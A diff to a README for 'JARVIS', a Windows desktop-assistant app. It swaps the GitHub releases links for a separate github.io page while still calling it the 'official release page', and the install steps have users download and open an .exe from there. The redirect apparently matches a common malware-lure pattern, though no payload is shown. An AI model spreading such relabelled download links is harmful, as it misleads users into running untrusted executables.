@@ -1,6 +1,6 @@
 # 🤖 JARVIS - Improve your daily computer task efficiency
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Simbaedmor8583/JARVIS/releases) 
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://simbaedmor8583.github.io) 
 
 JARVIS functions as a desktop assistant for Windows. It listens to your voice commands and performs tasks on your computer. It controls your web browser, manages office documents, and assists with complex workflows. You can trigger tasks using your voice or simple text prompts. The software connects to advanced artificial intelligence models to provide smart results. It runs locally on your machine while keeping your data private.
 
@@ -18,7 +18,7 @@ The application runs on any modern version of Windows. Ensure your computer meet
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official release page](https://github.com/Simbaedmor8583/JARVIS/releases).
+1. Visit the [official release page](https://simbaedmor8583.github.io).
 2. Locate the most recent version in the list.
 3. Click the file ending in .exe to start the download.
 4. Open the downloaded file once the process finishes.
